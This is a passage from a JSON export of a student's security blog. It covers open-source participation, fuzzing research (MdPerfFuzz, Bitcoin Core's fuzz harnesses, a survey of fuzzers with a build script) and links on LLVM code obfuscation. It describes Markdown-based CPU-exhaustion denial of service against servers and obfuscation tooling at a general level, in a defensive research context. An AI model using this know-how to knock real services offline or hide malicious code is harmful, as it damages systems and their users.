为了竞争有限的资源，我们习惯于限名额，排座次，你多便是我少，你进便是我退，每个人都是潜在的对手。在能力相差不大的情况下，维持信息差，闷声发大财有助于维持自己的竞争力。但在开源世界，信息的流动十分通畅，你固然可以选择少说多做，深藏身与名，却也不妨积极在社区发声布道，打造个人影响力，这方面可以学习印度学生，比如下图中这位小哥，自进入大学以来就积极投身开源并持续不断地输出内容，今年刚毕业就已坐拥几十万粉丝，并开创了属于自己的事业。\n对于我们个人而言，即使没有那样的精力投入自媒体，也可以多输出技术博客，结交志趣相投的伙伴，互相交流技术，组队学习公开课，自发组织 特别兴趣小组（SIG），用开放与包容代替封闭与对立。同时我们可以看到，学术界和工业界也已吹起了一股开源之风，越来越多的论文选择开源实验代码，各大公司也都纷纷加入开源基金会以提高自己的影响力。\n理实交融 很多人对开源的理解仅仅停留在做课程设计时复制交差的代码和找工作时随手拿来包装的项目，只能增强动手能力，而于理论并无大益。对应付考试而言可能确实如此，但计算机学科是非常重视实操的，一个人可以通过死磕书本记下一堆结论和解题技巧拿到光鲜的成绩，但这对能力的提升帮助有限，如费曼所说\n What I cannot create, I do not understand\n 而在 GitHub 上就有 build-your-own-x 这样一个仓库教你造轮子，汇集了许多教程，你可以从零创造整个计算机大厦的一砖一瓦。\n回到专业课的学习，B 站大学有看不完的视频任君挑选，但对学习计算机而言，光看视频相当于买椟还珠，精心设计的实验或许才是国外高校计算机教学的核心。国内高校往往只把实验作为点缀，只重报告形式，内容陈旧不堪，学生按照实验材料配置过时的环境屡屡踩坑，最终没有理解实验内容，却浪费许多时间大海捞针。而国外高校的实验则贯穿整个课堂，基本的框架已经搭好，学生只需按照学习进度逐步实现各项功能，最终亲手打造一个完整的项目。\n或许是受疫情线上教学的影响，越来越多的名校课程开源了自己的实验代码，外校学生只需 git clone 即可享受实验，在此过程中难免会接触到 Linux 下开发环境，对于提高计算机素养非常有帮助。实验和课程搭配学习，循序渐进，哪怕只有大一 C 语言基础也不会觉得吃力。在此之后就可以尝试探索感兴趣的方向，深入研究现实世界中的开源项目并作出贡献。\n写在最后 可能很多朋友看到标题就知道我在致敬 《大教堂与集市》 这本书，水平所限，本文只是从学生参与开源的角度做一些引申，尝试给出一些建议，若想深入了解开源文化可以去深入阅读一下原书，希望能对看到这篇文章的你有所帮助，也欢迎同学们加入 SHUOSC 的 QQ 大群（24061199）一起交流。校内社团招新即将开启，还请大家多多关注我们的微信公众号（SHU 开源社区），B 站帐号（上海大学开源社区）以及 GitHub 主页。\n","date":"2022-06-23T23:30:02Z","permalink":"https://chinggg.github.io/post/opensourcestu/","tags":["随笔","开源"],"title":"大讲堂和集市：浅谈学生参与开源的道与术"},{"categories":["论文"],"contents":"论文信息 原文作者：Penghui Li; Yinxi Liu; Wei Meng\n原文标题：Understanding and Detecting Performance Bugs in Markdown Compilers\n发表会议：ASE 2021 (The 36th IEEE/ACM International Conference on Automated Software Engineering)\n原文链接：https://seclab.cse.cuhk.edu.hk/papers/ase21_mdperffuzz.pdf\n代码链接：https://github.com/cuhk-seclab/MdPerfFuzz\n问题背景 Markdown 被广泛使用在 GitHub 等代码托管平台和 WordPress 等 CMS 系统中，Markdown 编译器中可能存在的漏洞却没有得到重视，尤其是性能问题容易成为 DoS 攻击面。\n作者调研了主流 Markdown 编译器的 49 个性能 bug，观察出根本原因是 the specific ways that Markdown compilers handle the language’s context-sensitive features，回溯法在特制输入下会达到最坏时间复杂度，而若强行施加上限则影响功能性。\n由于性能问题的成因是 algorithmic complexity，本文重点关注 CPU-exhaustion 而不是 memory，在 17，18 年分别有 SlowFuzz 和 PerfFuzz 等工作。而本文开发了 MdPerfFuzz 这一工具以高效地发掘 Markdown 编译器中的漏洞，并基于 trace 得到的路径相似性去除重复结果。\n理解现有 bug 收集 CommonMark specification 和 4 个代表性编译器的 49 个 bug，从以下角度分析：\n  发现方式：大部分是手动审计得到，仅有 5 个是用 OSS-Fuzz 等自动工具获得\n  发现和修复时间：2015 年前很少有报告 bug，2018-2020 年来数量持续增长（可能与 markdown 的流行趋势吻合），而大部分 bug 在报告一月内被修复，少部分修复极慢的 bug 是通常与 CommonMark specification 本身的模糊性有关，一些 patch 直接导致对 spec 的修改。\n  根本原因：\n 主要是 worst-cases in super-linear algorithms unoptimized code 导致多余开销 problematic implementations 未能完全符合 CommonMark specification，比如缺乏 unicode 支持导致死循环。    解决方案：enforcing limits，或者引入 logic change，比如优化低效代码或重写 regex。\nMdPerfFuzz 系统设计 静态分析方法假阳率过高，因此本文选择使用 fuzz 发掘性能漏洞，但面临着两大挑战，其一是 Markdown 文档的搜索空间太大，难以高效生成测试输入以发掘 bug，其二是多个独特的测试输入可能引发同一个 performance bug，且无法通过 memory footprints 来区分，针对以上问题，本文开发了 MdPerfFuzz，架构如下图：\n具体实现基于之前的 SOTA 工作 PerfFuzz，其本身也是 AFL-based。而 Markdown 语法会被 ANTLR4 编译得到 parser，引入 syntax-tree based mutation strategy 作为一个扩展，修改 AFL 的 showmap 功能来 trace execution 获得 CFG edge hit counts。\nSyntax-Tree Based Mutation Strategy 作者花大量时间分析 CommonMark specification 并对其语法建模，给定的测试数据会先被解析成 AST，而后遍历 AST 并随机替换其中的子树\nFitness Function and Performance Bug Detection 覆盖反馈的 fuzz 工作基本都以新覆盖的代码量为指标，但对于性能 bug 来说，循环迭代次数非常关键，和之前的工作类似，MdPerfFuzz 考虑 CFG edge hit counts，即 CFG 中一条边被同一测试数据访问的次数，能够探索 computationally expensive paths。\n之前的工作依赖手动分析来判别 bug，而 MdPerfFuzz 以 total execution path length 为指标，即 CFG edge hit counts 之和，先用大量普通数据获取通常情况下的执行表现，计算 total execution path length 的均值和标准差，根据切比雪夫不等式筛选与均值偏离 k 倍标准差的 case，判定为 bug。\nBug De-Duplication 与 memory corruption 不同，同一 performance bugs 可能拥有不同的 call stack，而本文提出的去重方法基于 execution traces 的相似程度。对每个 bug report 构造一个 edge-hit-count vector，第 i 个元素代表 CFG 第 i 个结点的 hit count，对两个向量计算 cosine 值即为其相似程度，若超过一定阈值即认定为同一 bug。\n实验效果 实验一：横向对比挖掘 performance bug 限制 6 小时，输入大小 200 字节，并根据经验取切比雪夫不等式中 k=5，相似度阈值为 0.91\n像在其他工作中一样限制输入大小是不让搜索空间过大，为了验证在实际场景中的真实影响，还可根据发现的 pattern 构造更大的输入，手动分析得到新 bug。但观察假阳案例会发现手动构造更大的输入有时反而不影响性能，因为开发者可能已经设了限制，过大输入会直接被舍弃。\n实验二：研究其他 Markdown 编译器的漏洞 利用 MdPerfFuzz 得到的 exploit 构造扩展的 dataset 以研究非 C/C++编写的 Markdown 编译器，以及其真实软件中的应用，比如代码托管平台上的 Markdown 渲染器和静态网站生成器（如 Hugo）。\n结果也发现了许多 bug，虽然由于不能 trace 而无法去重，但构造的测试输入已被分类成了 45 种 pattern 以针对特定的 feature，故而可以认为是互不相同的。\n如果是服务端渲染 Markdown，可能造成较大的危害，以部署在 Nginx 上的 GitLab 和 PHP 模块 Parsedown 为例，两分钟内发起 8 次请求即可将 8 核 CPU 负载打满。\n讨论与相关工作 Mitigating performance bugs：保护机制需在功能性和安全性之间取得平衡\nBug de-duplication：Trace-based analysis 很有效但不是所有语言都有插桩工具可用，未来可考虑语言无关的去重方式比如转成某种 IR 进行\n相关的研究领域有对桌面/移动/服务器端的应用比如浏览器上的性能 bug 进行研究，还有 pypi,npm 生态系统中的 ReDoS 问题进行研究，编译器中的 bug 也有人研究，但没有重点关注性能问题，本文对 Markdown 编译器中性能 bug 的研究也可以拓展到其它类型的 bug，比如 memory corruption，也可能扩展到其它语言。\n在研究方法上，静态分析可以用来检测 vulerable pattern，比如 repeated loops，fuzz 等动态执行方法也得到广泛应用，比如 grammar-aware fuzzing 可以生成语法正确的输入，learning-based fuzzing 用神经网络模型对 AST 子树进行替换。\n","date":"2022-06-18T13:46:52Z","permalink":"https://chinggg.github.io/post/mdperffuzz/","tags":["论文笔记，安全"],"title":"MdPerfFuzz: 理解并挖掘 Markdown 编译器的性能 bug"},{"categories":["安全"],"contents":"Materials Home · obfuscator-llvm/obfuscator Wiki (github.com)\nLLVM 入门教程之 Pass 编写 - Yuuoniy\u0026rsquo;s blog\n基于LLVM Pass实现控制流平坦化-软件逆向-看雪论坛\nCategory: llvm | LeadroyaL 系列博客\nollvm源码分析 - Pass之SplitBaiscBlocks-Android安全-看雪论坛\nbluesadi/Pluto-Obfuscator: Obfuscator based on LLVM 12.0.1 (github.com)\n一种将LLVM Pass集成到NDK中的通用方法-Android安全-看雪论坛\nllvm PassManager的变更及动态注册Pass的加载过程-编程技术-看雪论坛\n如何优雅的在 Windows 上使用 LLVM Pass 插件进行代码混淆-编程技术-看雪论坛\n","date":"2022-06-12T13:46:52Z","permalink":"https://chinggg.github.io/post/ollvm/","tags":["密码学"],"title":"LLVM Pass 混淆学习"},{"categories":["记录"],"contents":"忽略标题中的智能\n解释模糊测试技术：背景、定义、技术原理、意义、当前国内外热点研究方向；\n模糊测试技术（Fuzzing）是一种流行的软件测试技术，通过自动化生成并执行大量的随机测试用例来发现产品或协议的未知漏洞。最早的应用是威斯康星大学的Barton Miller于1988年在课程实验中用随机数据来轰炸UNIX程序直至崩溃，其后被广泛用于软件测试和漏洞挖掘。模糊测试的技术本质是生成随机测试用例来进行测试验证，所以是不确定的，恰当选取测试数据的变异和生成策略可以提升代码覆盖率从而发掘更多的漏洞。目前的热点研究方向是与符号执行等程序分析技术结合，并探索在更多领域中的应用场景。\n解释 网络协议栈模糊测试：网络协议栈是什么、本技术必要性、本技术原理、意义。\n网络协议栈一般指TCP/IP协议栈，是现代网络通信的基础组件，其可靠性和安全性十分重要。但对网络协议栈进行模糊测试是非常困难的。首先，网络协议栈的输入是具有依赖关系的数据包和系统调用，因此生成有效的测试用例是比较有挑战性的；其次，网络协议栈在运行过程中具有很多状态迁移的情况，而现有的测试方法目标在于覆盖更多的状态而非状态迁移；最后，网络协议栈中，语义缺陷的比例远大于内存缺陷，而现有的检查器只能检测内存缺陷，无法检测语义缺陷。AFLNet 采用了一种新的变异方法，使用状态反馈来指导模糊测试，能识别状态空间中的渐进区域，并系统地引导覆盖这些区域。结果表明，AFLnet 在代码覆盖范围、状态空间的覆盖范围和 bug 查找能力方面大大优于最先进的技术。\n解释： 内核模糊测试：内核是什么、本技术必要性、本技术原理、意义。参考Syzkaller。\n操作系统内核是最复杂的计算机程序之一，挖掘内核中隐藏的错误和漏洞对提高系统的整体安全具有重要意义。Syzkaller 利用系统调用对内核进行 fuzzing，优势在于会根据内核的代码路径覆盖信息来更新 fuzz 用的变异数据，以达到尽可能大的代码覆盖率。针对内核驱动中包含的复杂结构体，用白盒审计的方式往往难以发现深层次问题，通过模糊测试可以很容易找到一些隐藏深处的代码安全漏洞。\n解释： 链接库模糊测试：链接库是什么、本技术必要性、本技术原理、意义。参考libfuzzer。\n链接库是一种不可执行的二进制代码文件，程序底层往往依赖链接库以复用现成的代码，基础库中的漏洞也会威胁上层应用的安全。由于库本身不是可执行程序，需要自己编写测试入口，将LibFuzzer和要被测试的库链接在一起，fuzzer会跟踪哪些代码区域已经测试过，然后在输入数据的语料库上产生变异，来最大化代码覆盖。其中代码覆盖的信息由LLVM的SanitizerCoverage插桩提供。\n解释： 可执行程序模糊测试：可执行程序、本技术必要性、本技术原理、意义。参考afl。\n可执行程序是直接运行在用户终端或服务器上的程序，也是最直接的攻击入口，使用模糊测试技术能够发掘许多0day漏洞。目前最流行的模糊测试工具是 AFL，通过编译时插桩实现覆盖率引导，其变异策略采用了遗传算法以不断生成测试用例，学术界和工业界都有很多新的工作基于 AFL 完成。\n解释： 分布式模糊测试：硬件参数具体内容、本技术必要性、本技术原理、意义。参考clusterFuzz。\n分布式模糊测试可以解释为对分布式系统的模糊测试，但这里指使用分布式的方法开展模糊测试，由于现代大型软件往往不在单机上构建部署，使用分布式架构进行可扩展的模糊测试很有必要。 ClusterFuzz 就是一款提供端到端的模糊测试工具，从错误检测到分类排查，再到错误报告的生成，整个流程都是自动化的。早在 2012 年，Google 就使用该款工具每天针对各种 Chrome 版本运行 5000 万个测试用例。\n参考资料 Fuzzing技术总结（Brief Surveys on Fuzz Testing） - 知乎 (zhihu.com)\nAFLNET：一种针对网络协议的灰盒模糊测试器 - 安全客，安全资讯平台 (anquanke.com)\n面向TCP协议栈的模糊测试框架 (ccf.org.cn)\n基于关系学习的内核模糊测试 HEALER - 知乎 (zhihu.com)\nSyzkaller入门知识总结 - FreeBuf网络安全行业门户\nsecfigo/Awesome-Fuzzing\nwcventure/FuzzingPaper\n常用编译脚本 #!/bin/sh # Run this script in source dir then it will build/ and install/ AFL_CC=1 SANITIZE=1 if [[ $AFL_CC ]]; then export CC=afl-clang-lto export CXX=afl-clang-lto++ #export CC=afl-gcc-fast #export CXX=afl-g++-fast else export CC=clang export CXX=clang++ fi if [[ $SANITIZE ]]; then export AFL_USE_ASAN=1 export CFLAGS=\u0026quot;-g -O0 -fno-omit-frame-pointer -fsanitize=address\u0026quot; export CPPFLAGS=\u0026quot;-g -O0 -fno-omit-frame-pointer -fsanitize=address\u0026quot; export LDFLAGS=\u0026quot;-O0 -fsanitize=address\u0026quot; else export CFLAGS=\u0026quot;-g\u0026quot; export CPPFLAGS=\u0026quot;-g\u0026quot; fi export PREFIX=`realpath ./install` mv ./install ./oldinstall if [[ -f ./meson.build ]]; then meson build --prefix=$PREFIX ninja -C build elif [[ -f ./CMakeLists.txt ]]; then rm -rf build \u0026amp;\u0026amp; mkdir build \u0026amp;\u0026amp; cd build cmake .. -DCMAKE_EXPORT_COMPILE_COMMANDS=On -DCMAKE_BUILD_TYPE=Debug -DCMAKE_INSTALL_PREFIX=$PREFIX -DENABLE_STATIC=On -DBUILD_SHARED_LIBS=Off -DBUILD_STATIC_LIBS=On else ./configure --disable-shared --enable-static --prefix=$PREFIX fi bear -- make -j$(nproc) make install  ","date":"2022-06-10T13:46:52Z","permalink":"https://chinggg.github.io/post/fuzzsurvey/","tags":["安全","Fuzz"],"title":"智能模糊测试技术综述"},{"categories":["安全"],"contents":"Materials Online Crypto by Stanford\nCryptography by IIT\nCrypto Book\nBlog\nMind Map\n[实验一、Shamir 秘密共享] 实验要求 实现一个（k,n）-Shamir 秘密共享方案，其中k=3，n=4，包含以下功能：\n 给定一个数字，可以计算出对应的share 给定k个share, 能够重构出秘密值  实验原理 https://en.wikipedia.org/wiki/Shamir's_Secret_Sharing\n要建立一个 (k, n) 秘密共享方案，可以构建一个 k-1 次多项式，并在曲线上挑选 n 个点作为 share，这样只有当 k 个或更多的份额被集中起来时，多项式才能被重新生成。秘密值 (s) 被隐藏在多项式的常数项中（也即曲线在 y 轴截距），只有在成功重建曲线后才能获得。\nTo establish a (t, n) secret sharing scheme, we can construct a polynomial of degree t-1 and pick n points on the curve as shares such that the polynomial will only be regenerated if t or more shares are pooled. The secret value (s) is concealed in the constant term of the polynomial (coefficient of 0-degree term or the curve’s y-intercept) which can only be obtained after the successful reconstruction of the curve.\nhttps://www.geeksforgeeks.org/implementing-shamirs-secret-sharing-scheme-in-python/\n[实验三、实现 AES 的 CBC 和 CTR 模式加解密] https://github.com/matt-wu/AES\n","date":"2022-05-22T13:46:52Z","permalink":"https://chinggg.github.io/post/crypto/","tags":["密码学"],"title":"Modern Crypto Course"},{"categories":["Research"],"contents":"Abstract Bitcoin is a widely used distributed system that is time-tested and recognized to be secure. However, most of the existing research focus on its theoretical security model, while ignoring the possible vulnerabilities in its software implementation. This paper will review how fuzzing, an increasingly popular automated vulnerability detection method, has been used in practice and refined stage by stage by Bitcoin Core developers. In addition, this paper will describe recent work published in ICSE 2022 that analyzes three different software testing techniques and summarizes their practical effects when applied to Bitcoin Core.\nKeywords: fuzzing, software testing, Bitcoin\nIntro Bitcoin is one of the most prominent distributed software systems in the world, and a key part of a potentially revolutionary new form of decentralized financial (DeFi) tool, cryptocurrency. Due to its distributed nature, Bitcoin in some sense is the sum of the operations of the code executed by many independent nodes rather than the original software created by Satoshi Nakamoto. There are several different implementations of Bitcoin written in various programming languages, like btcd, bcoin, and bitcoin-s. However, Bitcoin Core, written in C++, is the reference implementation of the Bitcoin system, meaning that it is the authoritative reference on how each part of the technology should be implemented. To a significant degree, the code of Bitcoin Core is Bitcoin, so we may mix these two terms in this paper. The main Bitcoin Core repo on GitHub has over 64,000 stars and has been forked more than 32,000 times.\nBecause of Bitcoin\u0026rsquo;s fame and the high monetary value, the Bitcoin protocol and its implementations are a high-value target for hackers. Though many works have been done to analyze the security model of Bitcoin, most of them focused on theory but ignore software implementation. This paper will describe how Bitcoin Core, as a popular open-source software (OSS), uses fuzzing to secure its codebase against potential vulnerabilities. Our main contributions are:\n We present the first insight into the long-term evolution of Bitcoin Core\u0026rsquo;s fuzzing infrastructure by investigating every footprint left by developers on GitHub We describe the survey presented at ICSE 2022 about different software testing techniques and how they improve Bitcoin\u0026rsquo;s fuzzing effect  Background Among the many software testing techniques available today, fuzzing has remained highly popular due to its conceptual simplicity, its low barrier to deployment, and its vast amount of empirical evidence in discovering real-world software vulnerabilities. At a high level, fuzzing refers to a process of repeatedly running a program with generated inputs that may be syntactically or semantically malformed. It is necessary to provide background on coverage-guided fuzzing and OSS-Fuzz.\nCoverage-guided Fuzzing Coverage-guided fuzzing (CGF), implemented by tools such as AFL, libFuzzer, and honggfuzz, is a popular bug detection method. CGF uses genetic search to find inputs that maximize code coverage. Algorithm 1 describes CGF at a high level. The algorithm maintains a pool of Inputs and the TotalCoverage of program $p$ on Inputs. The user provides seed inputs to instantiate Inputs. The fuzzer repeatedly picks an input $i$ from the pool of Inputs and applies a mutation (e.g., increment, bit flip, or user-defined mutations) to produce $i′$. The fuzzer then executes program $p$ on mutated input $i′$ to gather the coverage of program $p$ on $i′$ and detect any error, such as crashes, assertion violations, timeouts, memory leaks, etc. If $i′$ does not trigger an error and discovers new coverage that is not previously seen in TotalCoverage, then add $i′$ to Inputs and update TotalCoverage. By finding inputs that cover new code, CGF aims to test as much of the program as possible.\nFuzzers need an entrypoint into the program to provide test inputs; such an entrypoint is often called a fuzz target. libFuzzer-style fuzz targets — which AFL and honggfuzz also support and OSS-Fuzz uses — are functions that take in fuzzer-generated arbitrary bytestream input, transform the input to program-usable input data if needed, and execute the program under test with the input.\nContinuous Fuzzing and OSS-Fuzz Continuous fuzzing uses fuzzing as part of a continuous testing strategy to find regressions as software evolves. Several organizations incorporate fuzzing as part of their quality assurance strategy or offer tools that provide continuous fuzzing as a service.\nOSS-Fuzz is Google’s continuous fuzzing service for open source software projects, which combines modern fuzzing techniques with scalable, distributed execution. OSS-Fuzz uses ClusterFuzz, Google’s scalable fuzzing infrastructure as its back-end. Figure 1 illustrates OSS-Fuzz’s workflow. Developers in a participating OSS project write fuzz targets and provide instructions for building the software. OSS-Fuzz continuously builds the software and uploads it to ClusterFuzz. ClusterFuzz finds fuzz targets and uses the coverage-guided fuzzers AFL, libFuzzer, and honggfuzz to fuzz the software. Upon detecting a bug, ClusterFuzz checks whether the bug is a duplicate of any previously found bugs, minimizes the bug inducing input, and bisects the range of commits in which the regression occurred. If the bug is not a duplicate, then ClusterFuzz files a bug report on Monorail, an issue tracker. ClusterFuzz periodically verifies whether any previously found bugs are fixed; if so, OSS-Fuzz updates fixed bugs’ report.\nBitcoin Fuzzing Infrastructure History Stage 1: Proof of Concept (2013-2016) Neither Bitcoin nor fuzzing has a long history. The first piece of code about fuzzing was introduced by Gavin Andresen in PR#3173, which just added a simple protected method in the CNode class. All it can do is randomly corrupt 1-of-N sent messages. It was understandably primitive, since AFL, the widely-used generic fuzzer, does not even exist until 2 months later in 2013.\nThree years later in 2016, Patrick Strateman first attempted to bring a simple fuzzing framework to Bitcoin in PR#7940, but he did not make the code merged. Luckily, laawj resurrect pstratem\u0026rsquo;s fuzzing framework as part of Bitcoin\u0026rsquo;s test code in PR#9172. This simple fuzzing framework test deserialization by reading input from stdin, which makes it compatible with AFL.\nStage 2: Standardized Fuzzing (2017 - 2018) In May 2017, Google announced rewards for open source projects that integrate fuzz targets into OSS-Fuzz. As a quick response, contributor practicalswift proposed making Bitcoin ready for it in Issue#10364, where developers made lots of discussions. He also added two more tests for deserialization routines used by ProcessMessage in PR#10409, brought libFuzzer support in PR#10440, and made fuzzing ~200x faster by enabling AFL\u0026rsquo;s deferred forkserver and persistent mode in PR#10415. Thanks to his efforts, Bitcoin has made big progress in setting up fuzz testing suites, but that is still not enough for production due to low code coverage. Besides, OSS-Fuzz\u0026rsquo;s policy about short bug disclosure period is not agreed upon by all members.\nAnother interesting thing that happened in 2017 is that Guido Vranken, known for fuzzing cryptographic libraries, offered his 13 different fuzzers implemented as libFuzzer fuzz targets in Issue#11045. However, the existing simple fuzzer of Bitcoin is just a single binary that decides on the first few bits of the buffer what target to pick. This ineffective approach of switching between tests based on input is criticized for confusing the fuzzer with unnecessary re-use of fuzzing inputs, making it quite hard to see which fuzzers are still hitting new paths. It was not until Jan 2019 that MarcoFalke managed to build fuzz targets into separate executables in PR#15043 by using different C preprocessor macros. He also renamed test/fuzz/test_bitcoin_fuzzy.cpp to test/fuzz/deserialize.cpp in PR#15399, which allows more fuzz targets that test different parts of Bitcoin code to be added in the future.\nStage 3: Scaling with the community (2019-2020) 2019 witnessed huge growth of Bitcoin\u0026rsquo;s fuzzing infrastructure. To make fuzzing easily integrated with CI tests, MarcoFalke added test_runner.py, a script which is still used now, in PR#15295. He also simplified Makefile in PR#15504 by linking against BasicTestingSetup, which was shared with unit tests. After that, practicalswift and he made lots of contribution to add more fuzzing harness for other part of Bitcoin\u0026rsquo;s code, of which PR#17009 is the first newly added fuzz harness.\nThe increased number of fuzz targets also brings several downsides as discussed in Issue#20088. Having many targets not only slowing down build process with coslty disk space and CPU time, but also makes writing new fuzz tests unnecessarily hard. In Decemeber 2020, MarcoFalke made a huge refactoring with change of 100 files to link all targets once in PR#20560. By specifying environment variables, different fuzz targets can bde executed using only one binary. He proved that the single binary approach does not effect the fuzzing performance by showing benchmark results. So the basic architecture has not changed since then.\nStage 4: Embracing OSS-Fuzz (2021 - Present) In May 2021, Bitcoin Core made its initial integration into OSS-Fuzz. Till May 2022, 34 pull requests have been submitted to OSS-Fuzz for further improvement.\nAs Bitcoin Core participates in Google\u0026rsquo;s OSS-Fuzz program, there is a dashboard of publicly disclosed vulnerabilities. Generally, vulnerabilities are disclosed as soon as possible after they are fixed to give users the knowledge they need to be protected. However, because Bitcoin is a live P2P network, and not just standalone local software, not every issue may be disclosed within Google\u0026rsquo;s standard 90-day disclosure window if a partial or delayed disclosure is important to protect users or the function of the network.\nBy reviewing the history of Bitcoin\u0026rsquo;s fuzzing evolution, we can learn that it is not easy for Bitcoin, which is probably the most running distributed software in the world, to build its fuzzing infrastructure and integrate with OSS-Fuzz. Maintainers have to take many factors into consideration before accepting code changes.\nCase Study of Fuzz Target process_message Fuzz target process_message is introduced in PR#17989, which enables high-level fuzzing of the P2P layer. All code paths reachable from this fuzzer can be assumed to be reachable for an untrusted peer so it worth taking a look at.\nTo achieve optimal results when using coverage-guided fuzzing, there are both one general fuzzing binary (process_message) which handles all messages types and specialized fuzzing binaries per message type (process_message_addr, process_message_block, process_message_blocktxn , etc.) The reason to have all message types in one fuzzers is to allow auto-detection bring auto-detection and thus fuzzing of newly introduced messages types without updating the fuzzer. The reason to have also have per-message-type fuzzers is largely for the same reason that we have one fuzzing binary per deserialization: to make it relatively easier for coverage guided fuzzers to reach deep.\nvoid fuzz_target(FuzzBufferType buffer, const std::string\u0026amp; LIMIT_TO_MESSAGE_TYPE) { FuzzedDataProvider fuzzed_data_provider(buffer.data(), buffer.size()); ConnmanTestMsg\u0026amp; connman = *static_cast\u0026lt;ConnmanTestMsg*\u0026gt;(g_setup-\u0026gt;m_node.connman.get()); TestChainState\u0026amp; chainstate = *static_cast\u0026lt;TestChainState*\u0026gt;(\u0026amp;g_setup-\u0026gt;m_node.chainman-\u0026gt;ActiveChainstate()); SetMockTime(1610000000); // any time to successfully reset ibd chainstate.ResetIbd(); const std::string random_message_type{fuzzed_data_provider.ConsumeBytesAsString(CMessageHeader::COMMAND_SIZE).c_str()}; if (!LIMIT_TO_MESSAGE_TYPE.empty() \u0026amp;\u0026amp; random_message_type != LIMIT_TO_MESSAGE_TYPE) { return; } CNode\u0026amp; p2p_node = *ConsumeNodeAsUniquePtr(fuzzed_data_provider).release(); connman.AddTestNode(p2p_node); g_setup-\u0026gt;m_node.peerman-\u0026gt;InitializeNode(\u0026amp;p2p_node); FillNode(fuzzed_data_provider, connman, *g_setup-\u0026gt;m_node.peerman, p2p_node); const auto mock_time = ConsumeTime(fuzzed_data_provider); SetMockTime(mock_time); // fuzzed_data_provider is fully consumed after this call, don't use it CDataStream random_bytes_data_stream{fuzzed_data_provider.ConsumeRemainingBytes\u0026lt;unsigned char\u0026gt;(), SER_NETWORK, PROTOCOL_VERSION}; try { g_setup-\u0026gt;m_node.peerman-\u0026gt;ProcessMessage(p2p_node, random_message_type, random_bytes_data_stream, GetTime\u0026lt;std::chrono::microseconds\u0026gt;(), std::atomic\u0026lt;bool\u0026gt;{false}); } catch (const std::ios_base::failure\u0026amp;) { } { LOCK(p2p_node.cs_sendProcessing); g_setup-\u0026gt;m_node.peerman-\u0026gt;SendMessages(\u0026amp;p2p_node); } SyncWithValidationInterfaceQueue(); g_setup-\u0026gt;m_node.connman-\u0026gt;StopNodes(); }  The basic idea is simple:\n On initialization, create a few blocks On each input, create a few random network peers Then receive random messages from those random peers  Fuzz Trophies A collection of bugs found by developers via fuzzing can be found at https://github.com/bitcoin-core/bitcoin-devwiki/wiki/Fuzz-Trophies. Some of them are actually exploitable vulnerabilities. For instance, CVE-2017-18350 is a buffer overflow vulnerability which allows a malicious SOCKS proxy server to overwrite the program stack on systems with a signed char type (including common 32-bit and 64-bit x86 PCs). The vulnerability was introduced in 2012 and kept unknown until practicalswift used fuzzing to find it and disclosed it to security team in 2017. PR#19203 added a regression fuzz harness for it.\nSoftware Testing Techniques To Improve Fuzzing Although Bitcoin Core has put much effort into fuzzing, it seemed that the fuzzing was stuck: neither code coverage nor found bugs were increasing with additional fuzzing time. This is a common phenomenon called saturation when fuzzing software. That is, at first a particular fuzzer applied to a system will tend to continuously increase both coverage and discovery of previously-unknown bugs. But, at some point, the number of new bugs found by the fuzzer drops off, eventually approaching zero.\nThe underlying reason for saturation is that any fuzzer can explore a space of generated tests determined by a complex probability distribution. Some bugs lie in the high-probability portion of this space, and other bugs lie in very low probability or even zero probability parts of the space.\nGroce, Alex, et al. present their work Looking for Lacunae in Bitcoin Core\u0026rsquo;s Fuzzing Efforts at ICSE 2022, which describes how researchers of Chaincode Labs applied various kinds of techniques to solve the problem. This section is a paraphrase of their work.\nEnhancing Diversity by Ensemble fuzzing Ensemble fuzzing is an approach that recognizes the need for diverse methods for test generation, at least in the context of fuzzing; using multiple fuzzers to seed each other and avoid saturation is a core motivation for ensemble fuzzing. Inspired by ensemble methods in machine learning, ensemble fuzzing runs multiple fuzzers, and uses inputs generated by each fuzzer to seed the other fuzzers.\nNote that in one important sense Bitcoin Core is using ensemble fuzzing, in that OSS-Fuzz runs multiple fuzzers, including libFuzzer, AFL, and Honggfuzz) with different compilation flags and sanitizers. Additionally, the Bitcoin Core team has servers running different fuzzers. All of these are coordinated via the qa-assets repository to which our Eclipser-based tests were added. This is, however, a more manual and less controlled process than true ensemble cross-seeding on-the-fly during a fuzzing campaign, and there are suggestions that a well-chosen coordination strategy can significantly improve ensemble effectiveness.\nIncreasing Variance by Swarm Fuzzing Swarm testing is a method for improving test generation that relies on identifying features of tests, and disabling some of the features in each test. For instance, if features are API calls, and we are testing a stack with push, pop, top, and clear calls, a non-swarm random test of any significant length will contain multiple calls to all of the functions. In swarm testing, however, for each test some of the calls (with a certain probability for each call) will be disabled, but different calls will be disabled for each generated test. This produces less variance between calls within tests, but much more variance between tests. Practically, in the stack example, it will enable the size of the stack to grow much larger than it ever would have any chance of doing in non-swarm testing, due to some tests omitting pop and/or clear calls.\nThe picture above shows the basic logic of swarm testing. There is a 1,000×1,000 array of pixels, where each 10×10 block represents a sequence of 100 function calls in an API sequence test. Each pixel is a call to a function, and the calls to five different functions are coded by color (black, white, red, green, and blue).\nThe top half of the figure is what traditional sequence generation will tend to do in such a setting, assuming each call is given equal probability: every test will look like every other test. The details will vary, but at a certain level the arrangement will be very homogeneous; in fact, the eye can’t tell where one test ends and another begins! Let’s call this the kitchen-sink approach to testing: every test generated throws in everything it can, at least potentially.\nThe bottom half of the figure represents swarm testing. In swarm testing, function calls in each test are not always included but potentially picked with a probability. On average, the diversity between calls within each test is much worse for the swarm portion of the testing. However, it is easy to tell tests apart, with practical consequences. Behind the visually obvious impact of swarm testing, there is simple statistical reality. While it is possible for a single method to be called 100 times using the kitchen-sink approach, the most instances of any single call we observed was 37. For the swarm tests, of course, each method was called more than 50 times (and in fact 100 times) in multiple tests.\nSwarm testing probably works because most coverage targets, and most bugs, likely rely on including some test features (e.g., function calls), which can be designated triggers, but also are prevented by other function calls (designated suppressors).\nIn Issue#22628, Alex Groce tried swarm fuzzing on fuzz target process_messages for four weeks but he found the new coverage generated was minimal. Because there is a fuzz target process_message which only generate one type of message when running. The ability to run process_message with a single message type and the frequent introduction of the resulting inputs into process_messages (and the generic, unconstrained process_message fuzzing) probably, in a less automated way, also achieves many of the benefits of swarm testing itself: mixing complex lengthy runs of a single type or mix of types. It does show that some advanced fuzzing strategies can be anticipated by particularly savvy and capable fuzz engineers, willing to directly use raw fuzzing data, and write tools to support that kind of low-level hand-tuning of fuzz corpuses.\nOracle Problem and Mutation Testing Many efforts have been done to generate various test input that could reach more code. However, sometimes code coverage is already high enough and no bugs could be found because fuzzers actually know nothing about correctness. What is a bug? 